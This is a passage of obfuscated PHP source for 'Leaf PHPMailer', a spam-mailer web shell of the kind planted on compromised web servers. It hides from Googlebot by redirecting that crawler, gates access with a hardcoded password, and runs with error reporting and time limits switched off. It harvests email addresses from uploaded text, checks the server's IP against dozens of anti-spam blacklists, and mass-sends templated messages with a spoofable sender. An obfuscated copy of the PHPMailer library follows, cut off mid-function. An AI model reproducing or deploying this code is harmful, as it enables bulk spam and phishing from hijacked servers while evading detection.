<?php if(strstr(strtolower($_SERVER['HTTP_USER_AGENT']),"googlebot")){header("Location: 404");}else{${"GLOBALS"}["ohkwnptaain"]="password";${${"GLOBALS"}["ohkwnptaain"]}="mN329Md3OVS5";session_start();error_reporting(0);set_time_limit(0);ini_set("memory_limit",-1);$rupa_3332309223['version']="2.8";$rupa_3332309223['website']="leafmailer.pw";$fgjq_1202172248=md5(__FILE__);if(!empty($krca_901924565)and $_SESSION[$fgjq_1202172248]!=$krca_901924565){if(isset($_REQUEST['pass'])and $_REQUEST['pass']==$krca_901924565){$_SESSION[$fgjq_1202172248]=$krca_901924565;}else{print"<pre align=center><form method=post>Password: <input type='password' name='pass'><input type='submit' value='>>'></form></pre>";exit;}}session_write_close();function oqxa_3580578504($zlct_999008199,$irje_3885137012){$kjeu_4024072794=explode('@',$irje_3885137012);$qzcr_1228730357=$kjeu_4024072794[0];$vdgv_2967253784=$kjeu_4024072794[1];$zlct_999008199=str_replace("[-time-]",date("m/d/Y h:i:s a",time()),$zlct_999008199);$zlct_999008199=str_replace("[-email-]",$irje_3885137012,$zlct_999008199);$zlct_999008199=str_replace("[-emailuser-]",$qzcr_1228730357,$zlct_999008199);$zlct_999008199=str_replace("[-emaildomain-]",$vdgv_2967253784,$zlct_999008199);$zlct_999008199=str_replace("[-randomletters-]",djht_3362153591('abcdefghijklmnopqrstuvwxyz'),$zlct_999008199);$zlct_999008199=str_replace("[-randomstring-]",djht_3362153591('abcdefghijklmnopqrstuvwxyz0123456789'),$zlct_999008199);$zlct_999008199=str_replace("[-randomnumber-]",djht_3362153591('0123456789'),$zlct_999008199);$zlct_999008199=str_replace("[-randommd5-]",md5(djht_3362153591('abcdefghijklmnopqrstuvwxyz0123456789')),$zlct_999008199);return $zlct_999008199;}function bovh_2048179725($kdvd_2663297705){$kdvd_2663297705=urldecode($kdvd_2663297705);return stripslashes(trim($kdvd_2663297705));}function djht_3362153591($lxxt_3729620948){$ipnw_25009842=rand(12,25);$krca_901924565='';for($crku_3865851505=0;$crku_3865851505<$ipnw_25009842;$crku_3865851505++){$krca_901924565.=$lxxt_3729620948[(rand()%strlen($lxxt_3729620948))];}return $krca_901924565;}function zcoe_260502936($irje_3885137012){if(filter_var($irje_3885137012,FILTER_VALIDATE_EMAIL))return true;else return false;}if(isset($_GET['check_ip'])){if(isset($_GET['host'])){$_GET['host']=explode(",",$_GET['host']);foreach($_GET['host']as $xywq_3475444733){if(checkdnsrr($_GET['check_ip'].".".$xywq_3475444733.".","A"))$rhxa_1015983123="<font color='red'> Listed</font>";else $rhxa_1015983123="<font color='green'> Clean</font>";print'document.getElementById("'.$xywq_3475444733.'").innerHTML = "'.$rhxa_1015983123.'";';}exit;}$wbta_785352595=["all.s5h.net","b.barracudacentral.org","bl.spamcop.net","blacklist.woody.ch","bogons.cymru.com","cbl.abuseat.org","cdl.anti-spam.org.cn","combined.abuse.ch","db.wpbl.info","dnsbl-1.uceprotect.net","dnsbl-2.uceprotect.net","dnsbl-3.uceprotect.net","dnsbl.anticaptcha.net","dnsbl.dronebl.org","dnsbl.inps.de","dnsbl.sorbs.net","drone.abuse.ch","duinv.aupads.org","dul.dnsbl.sorbs.net","dyna.spamrats.com","dynip.rothen.com","http.dnsbl.sorbs.net","ips.backscatterer.org","ix.dnsbl.manitu.net","korea.services.net","misc.dnsbl.sorbs.net","noptr.spamrats.com","orvedb.aupads.org","pbl.spamhaus.org","proxy.bl.gweep.ca","psbl.surriel.com","relays.bl.gweep.ca","relays.nether.net","sbl.spamhaus.org","short.rbl.jp","singular.ttk.pte.hu","smtp.dnsbl.sorbs.net","socks.dnsbl.sorbs.net","spam.abuse.ch","spam.dnsbl.anonmails.de","spam.dnsbl.sorbs.net","spam.spamrats.com","spambot.bls.digibase.ca","spamrbl.imp.ch","spamsources.fabel.dk","ubl.lashback.com","ubl.unsubscore.com","virus.rbl.jp","web.dnsbl.sorbs.net","wormrbl.imp.ch","xbl.spamhaus.org","z.mailspike.net","zen.spamhaus.org","zombie.dnsbl.sorbs.net",];$bgcm_3284794326=implode(".",array_reverse(explode(".",$_GET['check_ip'])));$scuy_3210602170=count($wbta_785352595);ymht_355637499();print'<div class="container col-lg-6"><h3><font color="green"><span class="glyphicon glyphicon-leaf"></span></font> Leaf PHPMailer <small>Blacklist Checker</small></h3>';Print"Checking <b>".$_GET['check_ip']."</b> in <b>$scuy_3210602170</b>  anti-spam databases:<br>";$urpu_1111433152="";print'<table >';for($crku_3865851505=0;$crku_3865851505<$scuy_3210602170;$crku_3865851505=$crku_3865851505+10){$xywq_3475444733="";$bgko_3637339833="";for($hsep_2137352139=$crku_3865851505;$hsep_2137352139<$crku_3865851505+10;$hsep_2137352139++){$xywq_3475444733=$wbta_785352595[$hsep_2137352139];if(!empty($xywq_3475444733)){print"<tr> <td>$xywq_3475444733</td> <td id='$xywq_3475444733'>Checking ..</td></tr>";$bgko_3637339833.="$xywq_3475444733,";}}$urpu_1111433152.="<script src='?check_ip=$bgcm_3284794326&host=".$bgko_3637339833."' type='text/javascript'></script>";}print'</table></div>';print$urpu_1111433152;exit;}if(isset($_GET['emailfilter'])){if(!empty($_FILES['fileToUpload']['tmp_name'])){$_POST['emailList']=file_get_contents($_FILES["fileToUpload"]["tmp_name"]);}$_POST['emailList']=strtolower($_POST['emailList']);if($_GET['emailfilter']=="ifram"){if($_POST['resulttype']=="download"){header("Content-Description: File Transfer");header("Content-Type: application/octet-stream");header("Content-Disposition: attachment; filename=emails".time().".txt");}else{header("Content-Type: text/plain");}if($_POST['submit']=="extract"){$qsbb_2747071630='/[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}/';preg_match_all($qsbb_2747071630,$_POST['emailList'],$wzpa_103159226);foreach($wzpa_103159226[0]as $irje_3885137012){print$irje_3885137012."\n";}}elseif($_POST['submit']=="filter"){$ilee_1283582034=explode("\n",$_POST['emailList']);$rjdk_2858399070=explode("\n",strtolower($_POST['keywords']));foreach($ilee_1283582034 as $irje_3885137012){foreach($rjdk_2858399070 as $syhz_1519612219){if(strstr($irje_3885137012,$syhz_1519612219)){print$irje_3885137012."\n";break;}}}}exit;}ymht_355637499();print'<div class="container col-lg-4"><h3><font color="green"><span class="glyphicon glyphicon-leaf"></span></font> Leaf PHPMailer <small>Email Filter</small></h3>';print'
    <form action="?emailfilter=ifram" method="POST" target="my-iframe" enctype="multipart/form-data" onsubmit=\'\'>
        <label for="emailList">Text </label><input type="file" name="fileToUpload" id="fileToUpload"> 
        or

        <textarea name="emailList" id="emailList" class="form-control" rows="7" id="textArea"></textarea>
      <div class="col-lg-12">
        <div class="radio">
          <label>
            <input type="radio" name="resulttype" id="resulttype" value="here" checked="">
            Show Result in this page
          </label>
        </div>
        <div class="radio">
          <label>
            <input type="radio" name="resulttype" id="resulttype" value="download">
            Download Result (for big numbers)
          </label>
        </div>
      </div>
            <legend><h4>Extract Email</h4></legend>
            Detecting every email (100%) and order them line by line <br><br>
        <button type="submit" name="submit" value="extract" class="btn btn-default btn-sm">Start</button>
            <legend><h4>Filter Emails</h4></legend>
        <label >Keywords <small> ex: gmail.com or .co.uk</small> </label><textarea name="keywords" id="keywords" class="form-control" rows="4" id="textArea">gmail.com
hotmail.com
yahoo.com
.co.uk</textarea><br>

            <button type="submit" name="submit" value="filter" class="btn btn-default btn-sm">Start</button>
    </form>
    <label >Result </label>
    <iframe style="border:none;width:100%;" name="my-iframe"  src="?emailfilter=ifram" ></iframe>
   ';exit;}$zanp_410646757="checked";$pddh_905460609="selected";$aitm_2486965335="selected";if($_POST['action']=="send" or $_POST['action']=="score"){$lprm_2224870840=bovh_2048179725($_POST['senderEmail']);$yzwt_1457941275=bovh_2048179725($_POST['senderName']);$xgbh_1853530023=bovh_2048179725($_POST['replyTo']);$jsxw_4224597626=bovh_2048179725($_POST['subject']);$iyxz_542469786=bovh_2048179725($_POST['emailList']);$fopv_1219652353=bovh_2048179725($_POST['messageType']);$mtgd_4231067723=bovh_2048179725($_POST['messageLetter']);$jacn_1749612879=$_POST['encode'];$twsq_3215248917=$_POST['charset'];$zanp_410646757="";$pddh_905460609="";$aitm_2486965335="";if($fopv_1219652353==2)$smac_421552847="checked";else $zanp_410646757="checked";if($twsq_3215248917=="ISO-8859-1")$xfcw_1633189697="selected";else $pddh_905460609="selected";if($jacn_1749612879=="7bit")$hkid_75696582="selected";elseif($jacn_1749612879=="binary")$iofk_3336628485="selected";elseif($jacn_1749612879=="base64")$omqu_3482464886="selected";elseif($jacn_1749612879=="quoted-printable")$yqiy_4092968548="selected";else $aitm_2486965335="selected";}if($_POST['action']=="view"){$vsgt_82807833=bovh_2048179725($_POST['messageLetter']);$vsgt_82807833=oqxa_3580578504($vsgt_82807833,"user@domain.com");if($_POST['messageType']==2){print"<pre>".htmlspecialchars($vsgt_82807833)."</pre>";}else{print$vsgt_82807833;}exit;}if(!isset($_POST['senderEmail'])){$lprm_2224870840="support@".str_replace("www.","",$_SERVER['HTTP_HOST']);if(!zcoe_260502936($lprm_2224870840))$lprm_2224870840="";}class coye_4211091271{/**
     * The PHPMailer Version number.
     * @var string
     */ public $dfsh_1889659487='5.2.28';/**
     * Email priority.
     * Options: null (default), 1 = High, 3 = Normal, 5 = low.
     * When null, the header is not set at all.
     * @var integer
     */ public $ywhv_2614148721=null;/**
     * The character set of the message.
     * @var string
     */ public $ajam_1213509993='iso-8859-1';/**
     * The MIME Content-type of the message.
     * @var string
     */ public $zuuv_1391474895='text/plain';/**
     * The message encoding.
     * Options: "8bit", "7bit", "binary", "base64", and "quoted-printable".
     * @var string
     */ public $vtgt_2436799257='8bit';/**
     * Holds the most recent mailer error message.
     * @var string
     */ public $epyi_3619768924='';/**
     * The From email address for the message.
     * @var string
     */ public $vuzd_422055502='root@localhost';/**
     * The From name of the message.
     * @var string
     */ public $ejhh_3060979030='Root User';/**
     * The Sender email (Return-Path) of the message.
     * If not empty, will be sent via -f to sendmail or as 'MAIL FROM' in smtp mode.
     * @var string
     */ public $krhp_1487687673='';/**
     * The Return-Path of the message.
     * If empty, it will be set to either From or Sender.
     * @var string
     * @deprecated Email senders should never set a return-path header;
     * it's the receiver's job (RFC5321 section 4.4), so this no longer does anything.
     * @link https://tools.ietf.org/html/rfc5321#section-4.4 RFC5321 reference
     */ public $yscd_874448069='';/**
     * The Subject of the message.
     * @var string
     */ public $jbqr_879953894='';/**
     * An HTML or plain text message body.
     * If HTML then call isHTML(true).
     * @var string
     */ public $fect_2073732236='';/**
     * The plain-text message body.
     * This body can be read by mail clients that do not have HTML email
     * capability such as mutt & Eudora.
     * Clients that can read HTML will view the normal Body.
     * @var string
     */ public $yfzg_1454002957='';/**
     * An iCal message part body.
     * Only supported in simple alt or alt_inline message types
     * To generate iCal events, use the bundled extras/EasyPeasyICS.php class or iCalcreator
     * @link http://sprain.ch/blog/downloads/php-class-easypeasyics-create-ical-files-with-php/
     * @link http://kigkonsult.se/iCalcreator/
     * @var string
     */ public $llzh_3039545927='';/**
     * The complete compiled MIME message body.
     * @access protected
     * @var string
     */ protected $ooly_2132970980='';/**
     * The complete compiled MIME message headers.
     * @var string
     * @access protected
     */ protected $gvga_2252918924='';/**
     * Extra headers that createHeader() doesn't fold in.
     * @var string
     * @access protected
     */ protected $lrca_3609584388='';/**
     * Word-wrap the message body to this number of chars.
     * Set to 0 to not wrap. A useful value here is 78, for RFC2822 section 2.1.1 compliance.
     * @var integer
     */ public $betq_1076610050=0;/**
     * Which method to use to send mail.
     * Options: "mail", "sendmail", or "smtp".
     * @var string
     */ public $xcmw_120906707='mail';/**
     * The path to the sendmail program.
     * @var string
     */ public $gmay_1227588861='/usr/sbin/sendmail';/**
     * Whether mail() uses a fully sendmail-compatible MTA.
     * One which supports sendmail's "-oi -f" options.
     * @var boolean
     */ public $wkgj_2066187069=true;/**
     * Path to PHPMailer plugins.
     * Useful if the SMTP class is not in the PHP include path.
     * @var string
     * @deprecated Should not be needed now there is an autoloader.
     */ public $gamj_2327990444='';/**
     * The email address that a reading confirmation should be sent to, also known as read receipt.
     * @var string
     */ public $qedl_1490355040='';/**
     * The hostname to use in the Message-ID header and as default HELO string.
     * If empty, PHPMailer attempts to find one with, in order,
     * $_SERVER['SERVER_NAME'], gethostname(), php_uname('n'), or the value
     * 'localhost.localdomain'.
     * @var string
     */ public $bytx_472359495='';/**
     * An ID to be used in the Message-ID header.
     * If empty, a unique id will be generated.
     * You can set your own, but it must be in the format "<id@domain>",
     * as defined in RFC5322 section 3.6.4 or it will be ignored.
     * @see https://tools.ietf.org/html/rfc5322#section-3.6.4
     * @var string
     */ public $zalx_492569265='';/**
     * The message Date to be used in the Date header.
     * If empty, the current date will be added.
     * @var string
     */ public $tzrh_3899556997='';/**
     * SMTP hosts.
     * Either a single hostname or multiple semicolon-delimited hostnames.
     * You can also specify a different port
     * for each host by using this format: [hostname:port]
     * (e.g. "smtp1.example.com:25;smtp2.example.com").
     * You can also specify encryption type, for example:
     * (e.g. "tls://smtp1.example.com:587;ssl://smtp2.example.com:465").
     * Hosts will be tried in order.
     * @var string
     */ public $klqv_1863695555='localhost';/**
     * The default SMTP server port.
     * @var integer
     * @TODO Why is this needed when the SMTP class takes care of it?
     */ public $rbqk_3819172594=25;/**
     * The SMTP HELO of the message.
     * Default is $Hostname. If $Hostname is empty, PHPMailer attempts to find
     * one with the same method described above for $Hostname.
     * @var string
     * @see PHPMailer::$Hostname
     */ public $lxmt_633208423='';/**
     * What kind of encryption to use on the SMTP connection.
     * Options: '', 'ssl' or 'tls'
     * @var string
     */ public $djft_3967638391='';/**
     * Whether to enable TLS encryption automatically if a server supports it,
     * even if `SMTPSecure` is not set to 'tls'.
     * Be aware that in PHP >= 5.6 this requires that the server's certificates are valid.
     * @var boolean
     */ public $heoz_2291703979=true;/**
     * Whether to use SMTP authentication.
     * Uses the Username and Password properties.
     * @var boolean
     * @see PHPMailer::$Username
     * @see PHPMailer::$Password
     */ public $qijp_1307802276=false;/**
     * Options array passed to stream_context_create when connecting via SMTP.
     * @var array
     */ public $abcm_434338048=array();/**
     * SMTP username.
     * @var string
     */ public $zusl_19424289='';/**
     * SMTP password.
     * @var string
     */ public $kbzm_3434357891='';/**
     * SMTP auth type.
     * Options are CRAM-MD5, LOGIN, PLAIN, NTLM, XOAUTH2, attempted in that order if not specified
     * @var string
     */ public $yhlv_169653958='';/**
     * SMTP realm.
     * Used for NTLM auth
     * @var string
     */ public $nskg_995620062='';/**
     * SMTP workstation.
     * Used for NTLM auth
     * @var string
     */ public $skse_1265587911='';/**
     * The SMTP server timeout in seconds.
     * Default of 5 minutes (300sec) is from RFC2821 section 4.5.3.2
     * @var integer
     */ public $elxa_1325157390=300;/**
     * SMTP class debug output mode.
     * Debug output level.
     * Options:
     * * `0` No output
     * * `1` Commands
     * * `2` Data and commands
     * * `3` As 2 plus connection status
     * * `4` Low-level data output
     * @var integer
     * @see SMTP::$do_debug
     */ public $gjps_2937906380=0;/**
     * How to handle debug output.
     * Options:
     * * `echo` Output plain-text as-is, appropriate for CLI
     * * `html` Output escaped, line breaks converted to `<br>`, appropriate for browser output
     * * `error_log` Output to error log as configured in php.ini
     *
     * Alternatively, you can provide a callable expecting two params: a message string and the debug level:
     * <code>
     * $mail->Debugoutput = function($str, $level) {echo "debug level $level; message: $str";};
     * </code>
     * @var string|callable
     * @see SMTP::$Debugoutput
     */ public $rbcy_2683364661='echo';/**
     * Whether to keep SMTP connection open after each message.
     * If this is set to true then to close the connection
     * requires an explicit call to smtpClose().
     * @var boolean
     */ public $preq_1697864705=false;/**
     * Whether to split multiple to addresses into multiple messages
     * or send them all in one message.
     * Only supported in `mail` and `sendmail` transports, not in SMTP.
     * @var boolean
     */ public $akff_2239709924=false;/**
     * Storage for addresses when SingleTo is enabled.
     * @var array
     * @TODO This should really not be public
     */ public $lzdw_2514318201=array();/**
     * Whether to generate VERP addresses on send.
     * Only applicable when sending via SMTP.
     * @link https://en.wikipedia.org/wiki/Variable_envelope_return_path
     * @link http://www.postfix.org/VERP_README.html Postfix VERP info
     * @var boolean
     */ public $jsqm_3962621662=false;/**
     * Whether to allow sending messages with an empty body.
     * @var boolean
     */ public $dvzm_2870748932=false;/**
     * The default line ending.
     * @note The default remains "\n". We force CRLF where we know
     *        it must be used via self::CRLF.
     * @var string
     */ public $epfc_463710185="\n";/**
     * DKIM selector.
     * @var string
     */ public $appc_2880157352='';/**
     * DKIM Identity.
     * Usually the email address used as the source of the email.
     * @var string
     */ public $bqdp_1470938417='';/**
     * DKIM passphrase.
     * Used if your key is encrypted.
     * @var string
     */ public $pgen_3082870351='';/**
     * DKIM signing domain name.
     * @example 'example.com'
     * @var string
     */ public $tglb_1746101056='';/**
     * DKIM private key file path.
     * @var string
     */ public $obpu_868737972='';/**
     * DKIM private key string.
     * If set, takes precedence over `$DKIM_private`.
     * @var string
     */ public $paza_2597073969='';/**
     * Callback Action function name.
     *
     * The function that handles the result of the send email action.
     * It is called out by send() for each email sent.
     *
     * Value can be any php callable: http://www.php.net/is_callable
     *
     * Parameters:
     *   boolean $result        result of the send action
     *   array   $to            email addresses of the recipients
     *   array   $cc            cc email addresses
     *   array   $bcc           bcc email addresses
     *   string  $subject       the subject
     *   string  $body          the email body
     *   string  $from          email address of sender
     * @var string
     */ public $kelb_494495323='';/**
     * What to put in the X-Mailer header.
     * Options: An empty string for PHPMailer default, whitespace for none, or a string to use
     * @var string
     */ public $edjd_1000356574=' ';/**
     * Which validator to use by default when validating email addresses.
     * May be a callable to inject your own validator, but there are several built-in validators.
     * @see PHPMailer::validateAddress()
     * @var string|callable
     * @static
     */ public static $wxkp_4204957896='auto';/**
     * An instance of the SMTP sender class.
     * @var SMTP
     * @access protected
     */ protected $endy_60245459=null;/**
     * The array of 'to' names and addresses.
     * @var array
     * @access protected
     */ protected $bqux_3616002756=array();/**
     * The array of 'cc' names and addresses.
     * @var array
     * @access protected
     */ protected $givi_3685882489=array();/**
     * The array of 'bcc' names and addresses.
     * @var array
     * @access protected
     */ protected $qyuj_779734746=array();/**
     * The array of reply-to names and addresses.
     * @var array
     * @access protected
     */ protected $fhbi_2714215995=array();/**
     * An array of all kinds of addresses.
     * Includes all of $to, $cc, $bcc
     * @var array
     * @access protected
     * @see PHPMailer::$to @see PHPMailer::$cc @see PHPMailer::$bcc
     */ protected $qros_1708271332=array();/**
     * An array of names and addresses queued for validation.
     * In send(), valid and non duplicate entries are moved to $all_recipients
     * and one of $to, $cc, or $bcc.
     * This array is used only for addresses with IDN.
     * @var array
     * @access protected
     * @see PHPMailer::$to @see PHPMailer::$cc @see PHPMailer::$bcc
     * @see PHPMailer::$all_recipients
     */ protected $urxm_314208271=array();/**
     * An array of reply-to names and addresses queued for validation.
     * In send(), valid and non duplicate entries are moved to $ReplyTo.
     * This array is used only for addresses with IDN.
     * @var array
     * @access protected
     * @see PHPMailer::$ReplyTo
     */ protected $ojwc_590451268=array();/**
     * The array of attachments.
     * @var array
     * @access protected
     */ protected $pqur_2036324795=array();/**
     * The array of custom headers.
     * @var array
     * @access protected
     */ protected $kmss_953836282=array();/**
     * The most recent Message-ID (including angular brackets).
     * @var string
     * @access protected
     */ protected $uteo_1274872399='';/**
     * The message's MIME type.
     * @var string
     * @access protected
     */ protected $rxgw_625724656='';/**
     * The array of MIME boundary strings.
     * @var array
     * @access protected
     */ protected $vnhb_1048445522=array();/**
     * The array of available languages.
     * @var array
     * @access protected
     */ protected $wcnk_3571151285=array();/**
     * The number of errors encountered.
     * @var integer
     * @access protected
     */ protected $kojw_2868006696=0;/**
     * The S/MIME certificate file path.
     * @var string
     * @access protected
     */ protected $ries_3651008238='';/**
     * The S/MIME key file path.
     * @var string
     * @access protected
     */ protected $ttpx_3374385982='';/**
     * The optional S/MIME extra certificates ("CA Chain") file path.
     * @var string
     * @access protected
     */ protected $riin_1666681282='';/**
     * The S/MIME password for the key.
     * Used only if the key is encrypted.
     * @var string
     * @access protected
     */ protected $xnoz_2345593098='';/**
     * Whether to throw exceptions for errors.
     * @var boolean
     * @access protected
     */ protected $xoiq_678566752=false;/**
     * Unique ID used for message ID and boundaries.
     * @var string
     * @access protected
     */ protected $phcu_1565510658='';/**
     * Error severity: message only, continue processing.
     */ const STOP_MESSAGE=0;/**
     * Error severity: message, likely ok to continue processing.
     */ const STOP_CONTINUE=1;/**
     * Error severity: message, plus full stop, critical error reached.
     */ const STOP_CRITICAL=2;/**
     * SMTP RFC standard line ending.
     */ const CRLF="\r\n";/**
     * The maximum line length allowed by RFC 2822 section 2.1.1
     * @var integer
     */ const MAX_LINE_LENGTH=998;/**
     * Constructor.
     * @param boolean $exceptions Should we throw external exceptions?
     */ public function slfz_1948388232($xoiq_678566752=null){if($xoiq_678566752!==null){$this->$cdmv_440379532=(boolean)$xoiq_678566752;}$this->$tgfy_1902925506=(strpos(PHP_SAPI,'cli')!==false?'echo':'html');}/**
     * Destructor.
     */ public function ekar_2147582106(){$this->ksue_1664024304();}/**
     * Call mail() in a safe_mode-aware fashion.
     * Also, unless sendmail_path points to sendmail (or something that
     * claims to be sendmail), don't pass params (not a perfect fix,
     * but it will do)
     * @param string $to To
     * @param string $subject Subject
     * @param string $body Message Body
     * @param string $header Additional Header(s)
     * @param string $params Params
     * @access private
     * @return boolean
     */ private function rypm_520871176($bqux_3616002756,$jsxw_4224597626,$ssxo_3685223346,$iinp_1853008065,$bmqr_2412646131){if(ini_get('mbstring.func_overload')&1){$jsxw_4224597626=$this->xdha_1719758595($jsxw_4224597626);}else{$jsxw_4224597626=$this->nsvw_633294872($this->xdha_1719758595($jsxw_4224597626));}if(ini_get('safe_mode')or!$this->$mnso_2768760914 or is_null($bmqr_2412646131)){$xkdg_325763347=@mail($bqux_3616002756,$jsxw_4224597626,$ssxo_3685223346,$iinp_1853008065);}else{$xkdg_325763347=@mail($bqux_3616002756,$jsxw_4224597626,$ssxo_3685223346,$iinp_1853008065,$bmqr_2412646131);}return $xkdg_325763347;}/**
     * Output debugging info via user-defined method.
     * Only generates output if SMTP debug output is enabled (@see SMTP::$do_debug).
     * @see PHPMailer::$Debugoutput
     * @see PHPMailer::$SMTPDebug
     * @param string $str
     */ protected function thqc_1132236784($mkrn_1554949113){if($this->$fpci_1743278776<=0){return;}if(!in_array($this->$tgfy_1902925506,array('error_log','html','echo'))and is_callable($this->$tgfy_1902925506)){call_user_func($this->$tgfy_1902925506,$mkrn_1554949113,$this->$fpci_1743278776);return;}switch($this->$tgfy_1902925506){case 'error_log':error_log($mkrn_1554949113);break;case 'html':echo htmlentities(preg_replace('/[\r\n]+/','',$mkrn_1554949113),ENT_QUOTES,'UTF-8')."<br>\n";break;case 'echo':default:$mkrn_1554949113=preg_replace('/\r\n?/ms',"\n",$mkrn_1554949113);echo gmdate('Y-m-d H:i:s')."\t".str_replace("\n","\n                   \t                  ",trim($mkrn_1554949113))."\n";}}/**
     * Send messages using SMTP.
     * @return void
     */ public function kytc_873271893(){$this->$okms_3272781023='smtp';}/**
     * Send messages using PHP's mail() function.
     * @return void
     */ public function zejf_4028348740(){$this->$okms_3272781023='mail';}/**
     * Send messages using $Sendmail.
     * @return void
     */ public function plye_727704392(){$crvq_2867554827=ini_get('sendmail_path');if(!stristr($crvq_2867554827,'sendmail')){$this->$wmik_1791783119='/usr/sbin/sendmail';}else{$this->$wmik_1791783119=$crvq_2867554827;}$this->$okms_3272781023='sendmail';}/**
     * Send messages using qmail.
     * @return void
     */ public function tmgm_2078620680(){$crvq_2867554827=ini_get('sendmail_path');if(!stristr($crvq_2867554827,'qmail')){$this->$wmik_1791783119='/var/qmail/bin/qmail-inject';}else{$this->$wmik_1791783119=$crvq_2867554827;}$this->$okms_3272781023='qmail';}/**
     * Add a "To" address.
     * @param string $address The email address to send to
     * @param string $name
     * @return boolean true on success, false if address already used or invalid in some way
     */ public function jvwg_3609129138($ttpe_223244161,$rxlv_1579384326=''){return $this->uuxu_3524052471('to',$ttpe_223244161,$rxlv_1579384326);}/**
     * Add a "CC" address.
     * @note: This function works with the SMTP mailer on win32, not with the "mail" mailer.
     * @param string $address The email address to send to
     * @param string $name
     * @return boolean true on success, false if address already used or invalid in some way
     */ public function ukhu_2909513380($ttpe_223244161,$rxlv_1579384326=''){return $this->uuxu_3524052471('cc',$ttpe_223244161,$rxlv_1579384326);}/**
     * Add a "BCC" address.
     * @note: This function works with the SMTP mailer on win32, not with the "mail" mailer.
     * @param string $address The email address to send to
     * @param string $name
     * @return boolean true on success, false if address already used or invalid in some way
     */ public function jckk_3976436167($ttpe_223244161,$rxlv_1579384326=''){return $this->uuxu_3524052471('bcc',$ttpe_223244161,$rxlv_1579384326);}/**
     * Add a "Reply-To" address.
     * @param string $address The email address to reply to
     * @param string $name
     * @return boolean true on success, false if address already used or invalid in some way
     */ public function hcmd_3022651540($ttpe_223244161,$rxlv_1579384326=''){return $this->uuxu_3524052471('Reply-To',$ttpe_223244161,$rxlv_1579384326);}/**
     * Add an address to one of the recipient arrays or to the ReplyTo array. Because PHPMailer
     * can't validate addresses with an IDN without knowing the PHPMailer::$CharSet (that can still
     * be modified after calling this function), addition of such addresses is delayed until send().
     * Addresses that have been added already return false, but do not throw exceptions.
     * @param string $kind One of 'to', 'cc', 'bcc', or 'ReplyTo'
     * @param string $address The email address to send, resp. to reply to
     * @param string $name
     * @throws phpmailerException
     * @return boolean true on success, false if address already used or invalid in some way
     * @access protected
     */ protected function uuxu_3524052471($oglx_1002749145,$ttpe_223244161,$rxlv_1579384326){$ttpe_223244161=trim($ttpe_223244161);$rxlv_1579384326=trim(preg_replace('/[\r\n]+/','',$rxlv_1579384326));if(($wtaj_2161764012=strrpos($ttpe_223244161,'@'))===false){$hfns_737763667=$this->zhkz_822707298('invalid_address')." (addAnAddress $oglx_1002749145): $ttpe_223244161";$this->atvy_1425932775($hfns_737763667);$this->thqc_1132236784($hfns_737763667);if($this->$cdmv_440379532){throw new gpmm_657600444($hfns_737763667);}return false;}$bmqr_2412646131=array($oglx_1002749145,$ttpe_223244161,$rxlv_1579384326);if($this->qarp_751062919(substr($ttpe_223244161,++$wtaj_2161764012))and $this->jxxl_1926302854()){if($oglx_1002749145!='Reply-To'){if(!array_key_exists($ttpe_223244161,$this->$afpv_852320140)){$this->$afpv_852320140[$ttpe_223244161]=$bmqr_2412646131;return true;}}else{if(!array_key_exists($ttpe_223244161,$this->$ycqy_3810730324)){$this->$ycqy_3810730324[$ttpe_223244161]=$bmqr_2412646131;return true;}}return false;}return call_user_func_array(array($this,'addAnAddress'),$bmqr_2412646131);}/**
     * Add an address to one of the recipient arrays or to the ReplyTo array.
     * Addresses that have been added already return false, but do not throw exceptions.
     * @param string $kind One of 'to', 'cc', 'bcc', or 'ReplyTo'
     * @param string $address The email address to send, resp. to reply to
     * @param string $name
     * @throws phpmailerException
     * @return boolean true on success, false if address already used or invalid in some way
     * @access protected
     */ protected function zzps_2738129686($oglx_1002749145,$ttpe_223244161,$rxlv_1579384326=''){if(!in_array($oglx_1002749145,array('to','cc','bcc','Reply-To'))){$hfns_737763667=$this->zhkz_822707298('Invalid recipient kind: ').$oglx_1002749145;$this->atvy_1425932775($hfns_737763667);$this->thqc_1132236784($hfns_737763667);if($this->$cdmv_440379532){throw new gpmm_657600444($hfns_737763667);}return false;}if(!$this->dsvx_2011588939($ttpe_223244161)){$hfns_737763667=$this->zhkz_822707298('invalid_address')." (addAnAddress $oglx_1002749145): $ttpe_223244161";$this->atvy_1425932775($hfns_737763667);$this->thqc_1132236784($hfns_737763667);if($this->$cdmv_440379532){throw new gpmm_657600444($hfns_737763667);}return false;}if($oglx_1002749145!='Reply-To'){if(!array_key_exists(strtolower($ttpe_223244161),$this->$abzh_2865723390)){array_push($this->$oglx_1002749145,array($ttpe_223244161,$rxlv_1579384326));$this->$abzh_2865723390[strtolower($ttpe_223244161)]=true;return true;}}else{if(!array_key_exists(strtolower($ttpe_223244161),$this->$ojew_958603384)){$this->$ojew_958603384[strtolower($ttpe_223244161)]=array($ttpe_223244161,$rxlv_1579384326);return true;}}return false;}/**
     * Parse and validate a string containing one or more RFC822-style comma-separated email addresses
     * of the form "display name <address>" into an array of name/address pairs.
     * Uses the imap_rfc822_parse_adrlist function if the IMAP extension is available.
     * Note that quotes in the name part are removed.
     * @param string $addrstr The address list string
     * @param bool $useimap Whether to use the IMAP extension to parse the list
     * @return array
     * @link http://www.andrew.cmu.edu/user/agreen1/testing/mrbs/web/Mail/RFC822.php A more careful implementation
     */ public function egdn_2080165615($geob_765662738,$esan_3583667328=true){$gjyn_1875539222=array();if($esan_3583667328 and function_exists('imap_rfc822_parse_adrlist')){$zkdz_1154021400=imap_rfc822_parse_adrlist($geob_765662738,'');foreach($zkdz_1154021400 as $ttpe_223244161){if($ttpe_223244161->$xcqu_4021340703!='.SYNTAX-ERROR.'){if($this->dsvx_2011588939($ttpe_223244161->$qpax_1615901171.'@'.$ttpe_223244161->$xcqu_4021340703)){$gjyn_1875539222[]=array('name'=>(property_exists($ttpe_223244161,'personal')?$ttpe_223244161->$dbom_2778004483:''),'address'=>$ttpe_223244161->$qpax_1615901171.'@'.$ttpe_223244161->$xcqu_4021340703);}}}}else{$zkdz_1154021400=explode(',',$geob_765662738);foreach($zkdz_1154021400 as 